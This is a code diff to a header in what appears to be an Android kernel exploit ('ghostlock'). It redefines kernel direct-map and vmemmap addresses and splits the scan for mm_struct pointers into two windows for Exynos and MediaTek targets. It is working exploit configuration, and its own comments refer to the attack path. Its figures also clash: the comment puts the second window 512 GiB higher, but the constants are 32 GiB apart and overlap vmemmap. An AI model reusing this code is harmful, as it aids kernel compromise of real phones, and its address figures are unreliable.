@@ -36,16 +36,28 @@ namespace ghostlock::target {
         inline constexpr std::uintptr_t kDirectMapBase = 0xffffffc000000000ULL;
         /* Upper bound only. apply_iomem_cache narrows this from a rooted
          * /proc/iomem dump, and its "reject a span >= DIRECT_MAP_END - BASE"
-         * guard means this value also has to exceed real DRAM. 64 GiB spans
-         * every A53 config and stays inside the 39-bit direct map. */
+         * guard means this value also has to exceed real DRAM. */
         inline constexpr std::uintptr_t kDirectMapEnd = 0xffffffd000000000ULL;
-        /* physmap_info lives in the low physical pages, so 8 GiB of direct map
-         * guarantees the identity words fall inside the scan while keeping the
-         * sweep far smaller than the default family's 48 GiB. */
+        /* physmap_info -- the array of mm_struct pointers the scan hunts for --
+         * is not contiguous in the direct map. The Exynos 1280 layout exposes
+         * it through two aliases: a low window at the page offset, and a high
+         * one 512 GiB above it. Upstream measured the low window at 2 GiB and
+         * the high one at ~1.5 GiB live on this SoC and kept 2 GiB for margin;
+         * those sizes are reused here, rebased from their VA48 addresses onto
+         * this device's VA39 page offset (+0x40000000000).
+         *
+         * Scanning only the low window never finds the pointers, and a single
+         * contiguous range spanning both would sweep 512 GiB of unrelated
+         * memory. */
+        inline constexpr std::uintptr_t kIdentityWindow0Start = 0xffffffc000000000ULL;
+        inline constexpr std::uintptr_t kIdentityWindow0End = 0xffffffc080000000ULL;
+        inline constexpr std::uintptr_t kIdentityWindow1Start = 0xffffffc800000000ULL;
+        inline constexpr std::uintptr_t kIdentityWindow1End = 0xffffffc880000000ULL;
+        inline constexpr std::size_t kIdentityWindowCount = 2;
+        /* Retained for callers that treat the scan as a single range. */
         inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
-                0xffffffc000000000ULL;
-        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd =
-                0xffffffc200000000ULL;
+                kIdentityWindow0Start;
+        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd = kIdentityWindow0End;
         /* Unused by the attack path; retained so the layout stays complete. */
         inline constexpr std::uintptr_t kVmemmapStart = 0xffffffc800000000ULL;
         inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
@@ -57,14 +69,21 @@ namespace ghostlock::target {
         inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;
         inline constexpr std::uintptr_t kPageOffset = 0xffffff8000000000ULL;
         inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
+        /* This family's physmap is contiguous, so one window covers it. The
+         * second slot repeats the first and is never scanned: the count below
+         * is what limits the loop, which keeps the array shape identical across
+         * families and out of the preprocessor. */
+        inline constexpr std::uintptr_t kIdentityWindow0Start = 0xffffff8000000000ULL;
+        inline constexpr std::uintptr_t kIdentityWindow0End = 0xffffff8c00000000ULL;
+        inline constexpr std::uintptr_t kIdentityWindow1Start = kIdentityWindow0Start;
+        inline constexpr std::uintptr_t kIdentityWindow1End = kIdentityWindow0End;
+        inline constexpr std::size_t kIdentityWindowCount = 1;
         inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
-                0xffffff8000000000ULL;
-        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd =
-                0xffffff8c00000000ULL;
+                kIdentityWindow0Start;
+        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd = kIdentityWindow0End;
         inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
         inline constexpr std::uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
         inline constexpr std::uintptr_t kVmemmapStart = 0xfffffffe00000000ULL;
-
 #endif
     } // namespace address
 
